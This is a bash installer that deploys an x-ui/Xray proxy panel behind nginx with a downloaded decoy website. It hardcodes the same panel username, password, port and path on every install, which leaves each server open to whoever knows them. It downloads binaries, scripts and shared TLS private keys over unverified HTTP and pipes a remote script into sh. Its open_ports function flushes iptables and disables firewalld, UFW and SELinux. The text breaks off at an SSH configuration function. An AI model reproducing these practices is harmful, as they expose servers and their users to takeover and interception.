#!/bin/bash

# 打印红色
red() {
  echo -e "\033[31m\033[01m$1\033[0m"
}

# 打印绿色
green() {
  echo -e "\033[32m\033[01m$1\033[0m"
}

# 打印黄色
yellow() {
  echo -e "\033[33m\033[01m$1\033[0m"
}

# 颜色常量
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
PLAIN='\033[0m'

# 系统信息匹配的正则表达式
REGEX=("debian" "ubuntu" "centos|red hat|kernel|oracle linux|alma|rocky" "amazon linux")
RELEASE=("Debian" "Ubuntu" "CentOS" "CentOS")
REL=("usuv.us.kg" "usur.us.kg" "lisqq.us.kg")
#RELL=("7728e8d8-d065-4df4-f8bb-bc564913b6f9" "12d4281f-db3b-441c-b78d-41708a6c9978" "785a1d5a-036b-4102-8576-fd0f8e0c144b" "c77c7360-6d7f-4045-8146-8926dee4292a" "7c00e53f-8e6a-4a12-bd05-0403a29f17cf" "6810d320-44f8-49c0-9efb-ed9d4754967b")

# 定义常用命令和包管理器
declare -A PACKAGE_UPDATE=(
  ["debian"]="apt -y update"
  ["ubuntu"]="apt -y update"
  ["centos"]="yum -y update"
  ["redhat"]="yum -y update"
  ["amazon"]="yum -y update"
)

declare -A PACKAGE_INSTALL=(
  ["debian"]="apt -y install"
  ["ubuntu"]="apt -y install"
  ["centos"]="yum -y install"
  ["redhat"]="yum -y install"
  ["amazon"]="yum -y install"
)

declare -A PACKAGE_UNINSTALL=(
  ["debian"]="apt -y autoremove"
  ["ubuntu"]="apt -y autoremove"
  ["centos"]="yum -y autoremove"
  ["redhat"]="yum -y autoremove"
  ["amazon"]="yum -y autoremove"
)

# 检查是否是root用户
if [[ $EUID -ne 0 ]]; then
  red "请以 root 用户身份运行脚本"
  exit 1
fi

# 获取操作系统信息
OS_NAME=$(grep -i pretty_name /etc/os-release 2>/dev/null | cut -d '=' -f2 | tr -d '"')
if [[ -z "$OS_NAME" ]]; then
  OS_NAME=$(hostnamectl 2>/dev/null | grep -i system | cut -d ':' -f2 | tr -d ' ')
fi

# 如果未能获取系统信息，则退出
if [[ -z "$OS_NAME" ]]; then
  red "无法识别操作系统"
  exit 1
fi

# 输出操作系统信息
echo -e "检测到的操作系统：$OS_NAME"

# 根据操作系统名称选择相应的包管理器命令
case "$OS_NAME" in
  *Debian*|*Ubuntu*)
    DISTRO="debian"
    ;;
  *CentOS*|*Red\ Hat*|*Oracle\ Linux*|*Alma*|*Rocky*)
    DISTRO="centos"
    ;;
  *Amazon*)
    DISTRO="amazon"
    ;;
  *)
    red "未支持的操作系统: $OS_NAME"
    exit 1
    ;;
esac

# 更新包
green "正在更新系统包..."
${PACKAGE_UPDATE[$DISTRO]}

# 安装常见包示例
# green "正在安装curl..."
# ${PACKAGE_INSTALL[$DISTRO]} curl

# 移除不需要的包示例
# green "正在移除不需要的包..."
# ${PACKAGE_UNINSTALL[$DISTRO]}

SITES=(
	http://www.zhuizishu.com/
	http://xs.56dyc.com/
	http://www.ddxsku.com/
	http://www.biqu6.com/
	https://www.wenshulou.cc/
	http://www.55shuba.com/
	http://www.39shubao.com/
	https://www.23xsw.cc/
	https://www.jueshitangmen.info/
	https://www.zhetian.org/
	http://www.bequgexs.com/
	http://www.tjwl.com/
)

# 获取当前工作目录
dir=$(pwd)

# 配置文件路径
CONFIG_FILE="/usr/local/x-ui/bin/config.json"

# 获取外部IP（IPv6优先，IPv4备选）
IP=$(curl -s6m8 ip.sb || curl -s4m8 ip.sb)

# 检查 IP 是否成功获取
if [[ -z "$IP" ]]; then
  echo "无法获取IP地址，请检查网络连接或代理设置。"
  exit 1
fi

# 输出获取到的 IP 地址
echo "获取的外部IP地址: $IP"

# 初始化变量
BT="false"
NGINX_CONF_PATH="/etc/nginx/conf.d/"

# 检查是否安装宝塔面板
if command -v bt &>/dev/null; then
  BT="true"
  NGINX_CONF_PATH="/www/server/panel/vhost/nginx/"
  echo "检测到宝塔面板，nginx 配置路径已更新为: $NGINX_CONF_PATH"
else
  echo "未检测到宝塔面板，nginx 配置路径保持为默认: $NGINX_CONF_PATH"
fi

# 协议标志初始化
VLESS="false"
TROJAN="false"
TLS="false"
WS="false"
XTLS="false"
KCP="false"

# 获取操作系统信息
get_system_info() {
    for i in "${OS_NAME[@]}"; do
        [[ -n "$i" ]] && echo "$i" && return
    done
}

# 匹配操作系统
detect_system() {
    local system_info="$1"
    for ((int = 0; int < ${#REGEX[@]}; int++)); do
        if [[ $(echo "$system_info" | tr '[:upper:]' '[:lower:]') =~ ${REGEX[$int]} ]]; then
            echo "${RELEASE[$int]}"
            return
        fi
    done
}

# 安装 curl
install_curl() {
    if [[ -z $(type -P curl) ]]; then
        green "curl 未安装，正在安装..."
        ${PACKAGE_UPDATE[$DISTRO]} && ${PACKAGE_INSTALL[$DISTRO]} curl
    else
        green "curl 已安装"
    fi
}

configNeedNginx() {
	local ws=$(grep wsSettings $CONFIG_FILE)
	[[ -z "$ws" ]] && echo no && return
	echo yes
}

needNginx() {
	[[ "$WS" == "false" ]] && echo no && return
	echo yes
}

# 获取架构信息
archAffix() {
    case "$(uname -m)" in
        i686 | i386) echo '32' ;;
        x86_64 | amd64) echo '64' ;;
        armv5tel) echo 'arm32-v5' ;;
        armv6l) echo 'arm32-v6' ;;
        armv7 | armv7l) echo 'arm32-v7a' ;;
        armv8 | aarch64) echo 'arm64-v8a' ;;
        mips64le) echo 'mips64le' ;;
        mips64) echo 'mips64' ;;
        mipsle) echo 'mips32le' ;;
        mips) echo 'mips32' ;;
        ppc64le) echo 'ppc64le' ;;
        ppc64) echo 'ppc64' ;;
        riscv64) echo 'riscv64' ;;
        s390x) echo 's390x' ;;
        *) red "不支持的CPU架构！" && exit 1 ;;
    esac
	return 0
}

# 检查 CentOS 8 并升级到 CentOS Stream 8
checkCentOS8() {
    if grep -iq "CentOS Linux 8" /etc/os-release; then
        yellow "检测到当前VPS系统为 CentOS 8，是否升级为 CentOS Stream 8 以确保软件包正常安装？"
        read -p "请输入 'y' 以确认升级，或其他任意键取消： " comfirmCentOSStream
        if [[ $comfirmCentOSStream == "y" ]]; then
            echo "正在升级至 CentOS Stream 8..."
            sleep 1
            sed -i -e "s|releasever|releasever-stream|g" /etc/yum.repos.d/CentOS-*
            yum clean all && yum makecache
            dnf swap centos-linux-repos centos-stream-repos distro-sync -y
            green "CentOS 升级至 CentOS Stream 8 完成！"
        else
            echo "升级已取消。"
            exit 1
        fi
    fi
}

status() {
    # 检查 xray 是否存在
    if [[ ! -f /usr/local/x-ui/bin/xray-linux-amd64 ]]; then
        echo 0
        return
    fi

    # 检查配置文件是否存在
    if [[ ! -f $CONFIG_FILE ]]; then
        echo 1
        return
    fi

    # 获取 xray 配置中的端口
    port=$(grep -oP '"port":\s*\K\d+' $CONFIG_FILE)

    # 检查端口是否被 xray 占用
    if ! ss -nutlp | grep -q ":$port"; then
        echo 2
        return
    fi

    # 判断是否需要 Nginx 配置
    if [[ $(configNeedNginx) != "yes" ]]; then
        echo 3
    else
        # 检查 Nginx 是否运行
        if ss -nutlp | grep -iq nginx; then
            echo 5
        else
            echo 4
        fi
    fi
}

statusText() {
    local res
    res=$(status)

    # 定义颜色输出
    local green="${GREEN}已安装${PLAIN}"
    local red="${RED}未运行${PLAIN}"
    local running="${GREEN}正在运行${PLAIN}"

    case $res in
        2) echo -e "$green $red" ;;
        3) echo -e "$green $running" ;;
        4) echo -e "$green $running, $red Nginx未运行${PLAIN}" ;;
        5) echo -e "$green $running, Nginx正在运行${PLAIN}" ;;
        *) echo -e "${RED}未安装${PLAIN}" ;;
    esac
}

showLog() {
    # 获取 Xray 的状态
    local res
    res=$(status)

    # 如果 Xray 未安装，提示并退出
    if [[ $res -lt 2 ]]; then
        red "Xray未安装，请先安装！"
        exit 1
    fi

    # 显示 Xray 服务日志
    journalctl -xe -u xray --no-pager
}

getData() {
    # 下载证书文件，如果启用了 TLS 或 XTLS
    if [[ "$TLS" == "true" || "$XTLS" == "true" ]]; then
        # 下载并解压证书
		DOMAIN=${REL[intt]}
        PEM="${DOMAIN}.pem"
        KEY="${DOMAIN}.key"
        
		if [[ ! -f ml.tar.gz ]]; then
			wget -qN --no-check-certificate "http://raw.githubusercontent.com/lisqq1/lisqq1/refs/heads/main/ml.tar.gz"
		fi
        
        # 解压证书文件
        tar -zxvf ml.tar.gz "$PEM" "$KEY"
        
        # 转小写
        DOMAIN="${DOMAIN,,}"

        # 检查文件是否解压成功
        if [[ -f "$dir/${DOMAIN}.pem" && -f "$dir/${DOMAIN}.key" ]]; then
            CERT_FILE="/usr/local/x-ui/${DOMAIN}.pem"
            KEY_FILE="/usr/local/x-ui/${DOMAIN}.key"
        else
            echo "证书文件下载失败，退出！"
            exit 1
        fi
    fi

    # 设置端口
    PORT=443
    XPORT=16167
    PPORT=16168

    # 如果启用了 WebSocket，设置路径
    if [[ "$WS" == "true" ]]; then
        WSPATH="/owk"
        WSPPATH="/owp"
    fi

    # 配置代理和远程主机
    if [[ "$TLS" == "true" || "$XTLS" == "true" ]]; then
        PROXY_URL=""
        REMOTE_HOST=$(echo "$PROXY_URL" | cut -d/ -f3)
        ALLOW_SPIDER="n"
    fi
}

installNginx() {
    # 检查是否有服务占用 80 或 443 端口，若有则卸载
    local httpd
    httpd=$(netstat -ntlp | grep -E ':80|:443' | cut -d "/" -f2)
    [[ -n "$httpd" ]] && ${PACKAGE_UNINSTALL[$DISTRO]} "$httpd"

	# 根据系统安装 Nginx
	if [[ "$BT" == "false" ]]; then
		if [[ $SYSTEM == "CentOS" ]]; then
			${PACKAGE_INSTALL[$DISTRO]} epel-release
			if [[ "$?" != "0" ]]; then
				echo '[nginx-stable]
name=nginx stable repo
baseurl=http://nginx.org/packages/centos/$releasever/$basearch/
gpgcheck=1
enabled=1
gpgkey=https://nginx.org/keys/nginx_signing.key
module_hotfixes=true' >/etc/yum.repos.d/nginx.repo
			fi
		fi
        ${PACKAGE_INSTALL[$DISTRO]} nginx || exit 1
        systemctl enable nginx
    else
        # 在宝塔环境下，检查 Nginx 是否已安装
        which nginx &>/dev/null || exit 1
    fi
}

startNginx() {
	if [[ "$BT" == "false" ]]; then
		systemctl start nginx
		if [[ $? -ne 0 ]]; then
			echo "重启 nginx 任务失败，错误代码: $?"
        return 1
		fi
	else
		nginx -c /www/server/nginx/conf/nginx.conf
	fi
}

stopNginx() {
    if [[ "$BT" == "false" ]]; then
        systemctl stop nginx
    else
        # 检查 Nginx 是否正在运行，若是则停止
        pgrep -x nginx &>/dev/null && nginx -s stop
    fi
}

getCert() {
    # 如果证书文件尚未定义，则开始获取证书
    if [[ -z ${CERT_FILE+x} ]]; then
        # 停止相关服务
        stopNginx
        systemctl stop xray

        # 检查端口是否被占用
        if netstat -ntlp | grep -E ':80|:443' &>/dev/null; then
            echo "端口 80 或 443 已被占用，退出！"
            exit 1
        fi

        # 安装必要的软件包
        ${PACKAGE_INSTALL[$DISTRO]} socat openssl
        if [[ "$SYSTEM" == "CentOS" ]]; then
            ${PACKAGE_INSTALL[$DISTRO]} cronie
            systemctl enable --now crond
        else
            ${PACKAGE_INSTALL[$DISTRO]} cron
            systemctl enable --now cron
        fi

        # 创建自动化邮件
        autoEmail=$(date +%s%N | md5sum | cut -c 1-32)
        curl -sL https://get.acme.sh | sh -s email="$autoEmail@gmail.com"
        source ~/.bashrc
        ~/.acme.sh/acme.sh --upgrade --auto-upgrade
        ~/.acme.sh/acme.sh --set-default-ca --server letsencrypt

        # 根据 IP 类型处理证书申请
        cert_cmd="~/.acme.sh/acme.sh --issue -d $DOMAIN --keylength ec-256 --standalone"
        post_hook="--post-hook \"systemctl restart nginx\""

        # 判断是否支持 IPv6
        if curl -sm8 ip.sb | grep -q ":"; then
            cert_cmd="$cert_cmd --listen-v6"
        fi

        # 处理不同环境的预钩子
        if [[ "$BT" == "false" ]]; then
            cert_cmd="$cert_cmd --pre-hook \"systemctl stop nginx\" $post_hook"
        else
            cert_cmd="$cert_cmd --pre-hook \"nginx -s stop || { echo -n ''; }\" $post_hook"
        fi

        # 执行证书申请命令
        eval "$cert_cmd"

        # 检查证书文件是否生成成功
        if [[ ! -f ~/.acme.sh/${DOMAIN}_ecc/ca.cer ]]; then
            echo "证书申请失败！"
            exit 1
        fi

        # 安装证书
        CERT_FILE="/usr/local/x-ui/${DOMAIN}.pem"
        KEY_FILE="/usr/local/x-ui/${DOMAIN}.key"
        ~/.acme.sh/acme.sh --install-cert -d $DOMAIN --ecc \
            --key-file "$KEY_FILE" \
            --fullchain-file "$CERT_FILE" \
            --reloadcmd "service nginx force-reload"

        # 验证证书文件是否安装成功
        if [[ ! -f "$CERT_FILE" || ! -f "$KEY_FILE" ]]; then
            echo "证书安装失败！"
            exit 1
        fi
    else
        # 如果证书已经存在，则直接复制
        cp "$dir/${DOMAIN}.pem" "/usr/local/x-ui/${DOMAIN}.pem"
        cp "$dir/${DOMAIN}.key" "/usr/local/x-ui/${DOMAIN}.key"
    fi
}

configNginx() {
    # 创建并清空网站根目录
    mkdir -p /usr/share/nginx/html
    cd /usr/share/nginx/html/ && rm -f ./*

    # 下载并解压 fakesite.zip，仅当文件不存在时下载
    if [[ ! -f fakesite.zip ]]; then
        wget -qN --no-check-certificate http://raw.githubusercontent.com/lisqq1/lisqq1/refs/heads/main/fakesite.zip
        unzip -o fakesite.zip
        rm -f fakesite.zip
    fi

    # 设置 robots.txt，防止搜索引擎抓取
    if [[ "$ALLOW_SPIDER" == "n" ]]; then
        echo 'User-Agent: *' > /usr/share/nginx/html/robots.txt
        echo 'Disallow: /' >> /usr/share/nginx/html/robots.txt
        ROBOT_CONFIG="    location = /robots.txt {}"
    else
        ROBOT_CONFIG=""
    fi

    # 备份 nginx 配置文件（如果不存在）
	if [[ "$BT" == "false" ]]; then
		if [[ ! -f /etc/nginx/nginx.conf.bak ]]; then
			mv /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak
		fi
		
		# 获取 nginx 用户
		res=$(id nginx 2>/dev/null)
		if [[ "$?" != "0" ]]; then
			user="www-data"
		else
			user="nginx"
		fi
		
		# 生成基本的 nginx 配置
		cat >/etc/nginx/nginx.conf <<-EOF
			user $user;
			worker_processes auto;
			error_log /var/log/nginx/error.log;
			pid /run/nginx.pid;
			
			# Load dynamic modules. See /usr/share/doc/nginx/README.dynamic.
			include /usr/share/nginx/modules/*.conf;
			
			events {
			    worker_connections 1024;
			}
			
			http {
			    log_format  main  '\$remote_addr - \$remote_user [\$time_local] "\$request" '
			                      '\$status \$body_bytes_sent "\$http_referer" '
			                      '"\$http_user_agent" "\$http_x_forwarded_for"';
			
			    access_log  /var/log/nginx/access.log  main;
			    server_tokens off;
			
			    sendfile            on;
			    tcp_nopush          on;
			    tcp_nodelay         on;
			    keepalive_timeout   65;
			    types_hash_max_size 2048;
			    gzip                on;
			
			    include             /etc/nginx/mime.types;
			    default_type        application/octet-stream;
			
			    # Load modular configuration files from the /etc/nginx/conf.d directory.
			    # See http://nginx.org/en/docs/ngx_core_module.html#include
			    # for more information.
			    include /etc/nginx/conf.d/*.conf;
			}
		EOF
	fi
	
	# 处理反向代理配置
	if [[ "$PROXY_URL" == "" ]]; then
		action=""
	else
		action="proxy_ssl_server_name on;
        proxy_pass $PROXY_URL;
        proxy_set_header Accept-Encoding '';
        sub_filter \"$REMOTE_HOST\" \"$DOMAIN\";
        sub_filter_once off;"
	fi
	
	# 配置 TLS/XTLS 相关内容
	if [[ "$TLS" == "true" || "$XTLS" == "true" ]]; then
		mkdir -p ${NGINX_CONF_PATH}
		if [[ "$WS" == "true" ]]; then
			cat >${NGINX_CONF_PATH}${DOMAIN}.conf <<-EOF
				server {
				    listen 80;
				    listen [::]:80;
				    server_name ${DOMAIN};
				    return 301 https://\$server_name:${PORT}\$request_uri;
				}
				
				server {
				    listen       ${PORT} ssl http2;
				    listen       [::]:${PORT} ssl http2;
				    server_name ${DOMAIN};
				    charset utf-8;
				
				    # ssl配置
				    ssl_protocols TLSv1.1 TLSv1.2;
				    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;
				    ssl_ecdh_curve secp384r1;
				    ssl_prefer_server_ciphers on;
				    ssl_session_cache shared:SSL:10m;
				    ssl_session_timeout 10m;
				    ssl_session_tickets off;
				    ssl_certificate $CERT_FILE;
				    ssl_certificate_key $KEY_FILE;
				
				    root /usr/share/nginx/html;
				    index index.php index.html index.htm;
				    location / {
				        $action
				    }
				    $ROBOT_CONFIG
				
				    location ^~ /veTJlqZSGGdFCFe {
				      proxy_pass http://127.0.0.1:49388/veTJlqZSGGdFCFe;
				      proxy_set_header Host \$host;
				      proxy_set_header X-Real-IP \$remote_addr;
				      proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
				    }

				    location ${WSPATH} {
				      proxy_redirect off;
				      proxy_pass http://127.0.0.1:${XPORT};
				      proxy_http_version 1.1;
				      proxy_set_header Upgrade \$http_upgrade;
				      proxy_set_header Connection "upgrade";
				      proxy_set_header Host \$http_host;
				      proxy_read_timeout 300s;
				      proxy_set_header X-Real-IP \$remote_addr;
				      proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
				    }

				    location ${WSPPATH} {
				      proxy_redirect off;
				      proxy_pass http://127.0.0.1:${PPORT};
				      proxy_http_version 1.1;
				      proxy_set_header Upgrade \$http_upgrade;
				      proxy_set_header Connection "upgrade";
				      proxy_set_header Host \$http_host;
				      proxy_read_timeout 300s;
				      proxy_set_header X-Real-IP \$remote_addr;
				      proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
				    }
				}
			EOF
		else
		    # 不使用 WebSocket 配置
			cat >${NGINX_CONF_PATH}${DOMAIN}.conf <<-EOF
				server {
				    listen 80;
				    listen [::]:80;
				    listen 81 http2;
				    server_name ${DOMAIN};
				    root /usr/share/nginx/html;
				    location / {
				        $action
				    }
				    $ROBOT_CONFIG
				}
			EOF
		fi
	fi
}

setSelinux() {
    # 检查并修改 SELinux 配置
    if [[ -s /etc/selinux/config && $(grep -i 'SELINUX=enforcing' /etc/selinux/config) ]]; then
        sed -i 's/SELINUX=enforcing/SELINUX=permissive/' /etc/selinux/config
        setenforce 0
        green "SELinux已设置为permissive模式，系统无需重启生效。"
    else
        green "SELinux已经是非强制模式或未配置。"
    fi
}

setFirewall() {
    # Check for available firewall tool
    if command -v firewall-cmd &>/dev/null; then
        # Using firewalld
        systemctl is-active --quiet firewalld && {
            firewall-cmd --permanent --add-service=http
            firewall-cmd --permanent --add-service=https
            [[ "$PORT" != "443" ]] && {
                firewall-cmd --permanent --add-port=${PORT}/tcp
                firewall-cmd --permanent --add-port=${PORT}/udp
            }
            firewall-cmd --reload
        } || {
            # Fallback to iptables if firewalld is not active
            iptables -C INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 80 -j ACCEPT
            iptables -C INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 443 -j ACCEPT
            [[ "$PORT" != "443" ]] && {
                iptables -C INPUT -p tcp --dport ${PORT} -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport ${PORT} -j ACCEPT
                iptables -C INPUT -p udp --dport ${PORT} -j ACCEPT 2>/dev/null || iptables -I INPUT -p udp --dport ${PORT} -j ACCEPT
            }
        }
    elif command -v iptables &>/dev/null; then
        # Using iptables
        iptables -C INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 80 -j ACCEPT
        iptables -C INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport 443 -j ACCEPT
        [[ "$PORT" != "443" ]] && {
            iptables -C INPUT -p tcp --dport ${PORT} -j ACCEPT 2>/dev/null || iptables -I INPUT -p tcp --dport ${PORT} -j ACCEPT
            iptables -C INPUT -p udp --dport ${PORT} -j ACCEPT 2>/dev/null || iptables -I INPUT -p udp --dport ${PORT} -j ACCEPT
        }
    elif command -v ufw &>/dev/null; then
        # Using UFW
        ufw status | grep -iq inactive && ufw enable
        ufw allow http/tcp
        ufw allow https/tcp
        [[ "$PORT" != "443" ]] && {
            ufw allow ${PORT}/tcp
            ufw allow ${PORT}/udp
        }
    fi
}

install() {
    # Fetch necessary data and check system compatibility
    getData
    checkCentOS8

    # Update and install required packages
    ${PACKAGE_UPDATE[$DISTRO]}
    ${PACKAGE_INSTALL[$DISTRO]} wget curl sudo vim unzip tar gcc openssl net-tools

    # Additional packages for non-CentOS systems
    [[ $SYSTEM != "CentOS" ]] && ${PACKAGE_INSTALL[$DISTRO]} libssl-dev g++

    # Ensure 'unzip' is installed
    [[ -z $(type -P unzip) ]] && { echo "unzip not found, exiting."; exit 1; }

    # Install and configure Nginx, firewall, and x-ui
    installNginx
    setFirewall
    install_x-ui

    # Obtain certificates if needed
    [[ $TLS == "true" || $XTLS == "true" ]] && getCert

    # Configure Nginx and SELinux
    configNginx
    setSelinux
}

uninstall() {
    # Check the status to ensure service is installed
    res=$(status)
    [[ $res -lt 2 ]] && return

    # Ask for confirmation before proceeding
    answer=y
    [[ "${answer,,}" == "y" ]] && {
        # Extract domain from config file (if exists)
        domain=$(grep -E 'Host|serverName' $CONFIG_FILE | cut -d: -f2 | tr -d \",' ')

        # Stop x-ui service and disable it
        x-ui stop
        systemctl disable x-ui
        rm -rf /etc/systemd/system/x-ui.service /usr/local/x-ui

        # Uninstall Nginx if not using BT (Baota)
        if [[ "$BT" == "false" ]]; then
            systemctl disable nginx
            ${PACKAGE_UNINSTALL[$DISTRO]} nginx
            [[ "$PMT" == "apt" ]] && ${PACKAGE_UNINSTALL[$DISTRO]} nginx-common
            rm -rf /etc/nginx/nginx.conf

            # Restore backup of nginx config if exists
            [[ -f /etc/nginx/nginx.conf.bak ]] && mv /etc/nginx/nginx.conf.bak /etc/nginx/nginx.conf
        fi

        # Remove domain-specific Nginx config if exists
        [[ -n "$domain" ]] && rm -rf ${NGINX_CONF_PATH}${domain}.conf

        # Uninstall SSL certificates if present
        [[ -f ~/.acme.sh/acme.sh ]] && ~/.acme.sh/acme.sh --uninstall
    }
}

start() {
    # Check if service is installed and running
    res=$(status)
    [[ $res -lt 2 ]] && return

    # Stop and start Nginx service, then restart x-ui
    stopNginx
    startNginx
    systemctl restart x-ui
    sleep 2

    # Check if Xray is listening on the specified port
    port=$(grep port $CONFIG_FILE | head -n 1 | cut -d: -f2 | tr -d \",' ')
    res=$(ss -nutlp | grep ${port} | grep -i xray)

    # If Xray is not running, log the error
    [[ -z "$res" ]] && echo "Xray启动失败，请检查日志或查看端口是否被占用！" >/dev/null
}

stop() {
    # Stop Nginx and Xray services
    stopNginx
    systemctl stop xray
}

restart() {
    # Restart the service (stop then start)
    res=$(status)
    [[ $res -lt 2 ]] && return
    stop
    start
}

setdns64() {
    # Check if IPv6 connectivity is available using a 6-second timeout
    if curl -s6m8 https://ip.gs >/dev/null; then
        # Set the DNS server to a specific IPv6 address
        echo "nameserver 2a01:4f8:c2c:123f::1" > /etc/resolv.conf
        echo "IPv6 DNS server set successfully."
    else
        # Inform user if IPv6 connectivity is not detected
        echo "No IPv6 connectivity detected. DNS configuration remains unchanged."
    fi
}

system_optimize() {
    # Check if sysctl.conf exists, if not, create it
    [ ! -f "/etc/sysctl.conf" ] && touch /etc/sysctl.conf

    # Remove existing configurations to avoid duplicates
    sed -i '/net.ipv4.tcp_retries2/d; 
            /net.ipv4.tcp_slow_start_after_idle/d;
            /net.ipv4.tcp_fastopen/d; 
            /fs.file-max/d;
            /fs.inotify.max_user_instances/d;
            /net.ipv4.tcp_syncookies/d;
            /net.ipv4.tcp_fin_timeout/d;
            /net.ipv4.tcp_tw_reuse/d;
            /net.ipv4.tcp_max_syn_backlog/d;
            /net.ipv4.ip_local_port_range/d;
            /net.ipv4.tcp_max_tw_buckets/d;
            /net.ipv4.route.gc_timeout/d;
            /net.ipv4.tcp_synack_retries/d;
            /net.ipv4.tcp_syn_retries/d;
            /net.core.somaxconn/d;
            /net.core.netdev_max_backlog/d;
            /net.ipv4.tcp_timestamps/d;
            /net.ipv4.tcp_max_orphans/d;
            /net.ipv4.ip_forward/d' /etc/sysctl.conf

    # Add optimized kernel parameters
    cat >> /etc/sysctl.conf <<EOF
net.ipv4.tcp_retries2 = 8
net.ipv4.tcp_slow_start_after_idle = 0
fs.file-max = 1000000
fs.inotify.max_user_instances = 8192
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_fin_timeout = 30
net.ipv4.tcp_tw_reuse = 1
net.ipv4.ip_local_port_range = 1024 65000
net.ipv4.tcp_max_syn_backlog = 16384
net.ipv4.tcp_max_tw_buckets = 6000
net.ipv4.route.gc_timeout = 100
net.ipv4.tcp_syn_retries = 1
net.ipv4.tcp_synack_retries = 1
net.core.somaxconn = 32768
net.core.netdev_max_backlog = 32768
net.ipv4.tcp_timestamps = 0
net.ipv4.tcp_max_orphans = 32768
# Forward ipv4
# net.ipv4.ip_forward = 1
EOF

    # Apply the new sysctl settings
    sysctl -p

    # Set user limits
    echo "*               soft    nofile           1000000
*               hard    nofile           1000000" > /etc/security/limits.conf

    # Apply the ulimit settings
    echo "ulimit -SHn 1000000" >> /etc/profile

    # Prompt for reboot
    read -p "系统优化配置已完成。是否立即重启VPS？ [Y/n] :" yn
    yn=${yn:-y}  # Default to 'y' if input is empty

    if [[ $yn =~ ^[Yy]$ ]]; then
        echo "VPS 重启中..."
        reboot
    fi
}

# Open all ports and disable firewall rules
open_ports() {
    # Stop and disable firewalld and ufw services
    systemctl stop firewalld.service && systemctl disable firewalld.service
    setenforce 0  # Disable SELinux enforcement
    ufw disable   # Disable UFW firewall if installed
    
    # Clear all iptables rules and set policies to ACCEPT
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    iptables -t nat -F
    iptables -t mangle -F
    iptables -F
    iptables -X

    # Save iptables configurations
    netfilter-persistent save
    yellow "VPS中的所有网络端口已开启"
}

# Disable IPv6
closeipv6() {
    clear
    # Remove any existing IPv6 disable configurations
    sed -i '/net.ipv6.conf.all.disable_ipv6/d' /etc/sysctl.conf /etc/sysctl.d/99-sysctl.conf
    sed -i '/net.ipv6.conf.default.disable_ipv6/d' /etc/sysctl.conf /etc/sysctl.d/99-sysctl.conf
    sed -i '/net.ipv6.conf.lo.disable_ipv6/d' /etc/sysctl.conf /etc/sysctl.d/99-sysctl.conf

    # Add IPv6 disable configuration
    echo -e "net.ipv6.conf.all.disable_ipv6 = 1\nnet.ipv6.conf.default.disable_ipv6 = 1\nnet.ipv6.conf.lo.disable_ipv6 = 1" >> /etc/sysctl.d/99-sysctl.conf
    
    # Apply changes
    sysctl --system
    green "禁用IPv6结束，可能需要重启！"
}

# Enable IPv6
openipv6() {
    clear
    # Remove any existing IPv6 disable configurations
    sed -i '/net.ipv6.conf.all.disable_ipv6/d' /etc/sysctl.conf /etc/sysctl.d/99-sysctl.conf
    sed -i '/net.ipv6.conf.default.disable_ipv6/d' /etc/sysctl.conf /etc/sysctl.d/99-sysctl.conf
    sed -i '/net.ipv6.conf.lo.disable_ipv6/d' /etc/sysctl.conf /etc/sysctl.d/99-sysctl.conf

    # Add IPv6 enable configuration
    echo -e "net.ipv6.conf.all.disable_ipv6 = 0\nnet.ipv6.conf.default.disable_ipv6 = 0\nnet.ipv6.conf.lo.disable_ipv6 = 0" >> /etc/sysctl.d/99-sysctl.conf
    
    # Apply changes
    sysctl --system
    green "开启IPv6结束，可能需要重启！"
}

gen_random_string() {
    # Ensure length is a positive integer
    local length="$1"
    if [[ ! "$length" =~ ^[0-9]+$ ]] || ((length <= 0)); then
        echo "Error: Length must be a positive integer"
        return 1
    fi
    
    # Efficient random string generation using /dev/urandom and tr
    tr -dc 'a-zA-Z0-9' </dev/urandom | head -c "$length"
}

# Configurations after installation
config_after_install() {
    local config_webBasePath="veTJlqZSGGdFCFe"
    local config_username="lisqq"
    local config_password="liqwerty1234@@"
    local config_port="49388"
    /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
    /usr/local/x-ui/x-ui migrate
}

# Install x-ui
install_x-ui() {
    cd /usr/local/
    url="http://raw.githubusercontent.com/lisqq1/lisqq1/refs/heads/main/x-ui-linux-$(archAffix).tar.gz"
    wget -qN --no-check-certificate -O "x-ui-linux-$(archAffix).tar.gz" "$url"

    # Check download status
    if [[ $? -ne 0 ]]; then
        echo -e "${red}Download x-ui $1 failed, please check if the version exists ${plain}"
        exit 1
    fi

    # Clean previous x-ui installation if exists
    if [[ -e /usr/local/x-ui/ ]]; then
        systemctl stop x-ui
        rm -rf /usr/local/x-ui/
    fi

    # Extract and install x-ui
    tar zxvf "x-ui-linux-$(archAffix).tar.gz"
    rm -f "x-ui-linux-$(archAffix).tar.gz"
    cd x-ui
    chmod +x x-ui

    # Rename binary if architecture is 64-bit
    if [[ $(archAffix) == "64" ]]; then
        mv bin/xray-linux-$(archAffix) bin/xray-linux-amd64
        chmod +x bin/xray-linux-amd64
    fi

    # Make x-ui executable and configure it
    chmod +x x-ui
    cp -f x-ui.service /etc/systemd/system/

    # Download and setup x-ui script
    wget --no-check-certificate -q -O /usr/bin/x-ui http://raw.githubusercontent.com/lisqq1/lisqq1/refs/heads/main/x-ui.sh
    chmod +x /usr/local/x-ui/x-ui.sh /usr/bin/x-ui

    # Configure settings after installation
    config_after_install
}

sshdconfig() {
    local authorized_keys_file="$dir/.ssh/authorized_keys"
    local id_rsa_pub_file="$dir/id_rsa.pub"
    local sshd_config_file="/etc/ssh/sshd_config"
